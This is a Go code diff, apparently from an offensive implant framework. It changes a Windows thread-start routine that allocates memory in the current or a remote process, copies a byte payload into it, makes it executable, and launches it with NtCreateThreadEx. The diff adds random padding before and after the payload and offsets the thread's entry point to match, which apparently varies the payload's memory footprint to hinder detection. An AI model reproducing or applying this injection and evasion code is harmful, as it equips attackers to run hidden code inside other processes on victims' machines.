@@ -27,6 +27,7 @@ import (
 
 	"github.com/iDigitalFlame/xmt/cmd/filter"
 	"github.com/iDigitalFlame/xmt/device/winapi"
+	"github.com/iDigitalFlame/xmt/util"
 	"github.com/iDigitalFlame/xmt/util/bugtrack"
 )
 
@@ -289,36 +290,49 @@ func (t *thread) Start(p uintptr, d time.Duration, a uintptr, b []byte) error {
 			return t.stopWith(exitStopped, err)
 		}
 	}
-	var (
-		// 0x20 - PAGE_EXECUTE_READ
-		z = uint32(0x20)
-		l = uint64(len(b))
-	)
+	// 0x20 - PAGE_EXECUTE_READ
+	z := uint32(0x20)
 	if a > 0 {
 		// 0x2 - PAGE_READONLY
 		z = 0x2
+	}
+	// Add a bit of "randomness" to where we start and end for funsies.
+	var (
+		s, e = uint64(util.FastRandN(2048)), uint64(util.FastRandN(2048))
+		v    = make([]byte, len(b)+int(s+e))
+		l    = uint64(len(v))
+	)
+	// NOTE(dij): We use the for loops here instead of 'Rand.Read' for readability
+	//            and to prevent 'v' from escaping.
+	for i := uint64(0); i < s; i++ { // If 's' is zero, this should be a NOP.
+		v[i] = byte(util.FastRandN(256))
+	}
+	if copy(v[s:], b); e > 0 {
+		for i := uint64(len(b)); i < l; i++ {
+			v[i] = byte(util.FastRandN(256))
+		}
 	}
 	if t.owner == winapi.CurrentProcess || t.owner == 0 {
 		// 0x4 - PAGE_READWRITE
 		if t.loc, err = winapi.NtAllocateVirtualMemory(t.owner, uint32(l), 0x4); err != nil {
 			return t.stopWith(exitStopped, err)
 		}
-		for i := range b {
-			(*(*[1]byte)(unsafe.Pointer(t.loc + uintptr(i))))[0] = b[i]
+		for i := range v {
+			(*(*[1]byte)(unsafe.Pointer(t.loc + uintptr(i))))[0] = v[i]
 		}
 		if _, err = winapi.NtProtectVirtualMemory(t.owner, t.loc, uint32(l), z); err != nil {
 			return t.stopWith(exitStopped, err)
 		}
-	} else if t.loc, err = writeMemory(t.owner, z, l, b); err != nil {
+	} else if t.loc, err = writeMemory(t.owner, z, l, v); err != nil {
 		return t.stopWith(exitStopped, err)
 	}
 	if a > 0 {
-		if t.hwnd, err = winapi.NtCreateThreadEx(t.owner, a, t.loc, t.suspended); err != nil {
+		if t.hwnd, err = winapi.NtCreateThreadEx(t.owner, a, t.loc+uintptr(s), t.suspended); err != nil {
 			return t.stopWith(exitStopped, err)
 		}
 		return nil
 	}
-	if t.hwnd, err = winapi.NtCreateThreadEx(t.owner, t.loc, 0, t.suspended); err != nil {
+	if t.hwnd, err = winapi.NtCreateThreadEx(t.owner, t.loc+uintptr(s), 0, t.suspended); err != nil {
 		return t.stopWith(exitStopped, err)
 	}
 	return nil
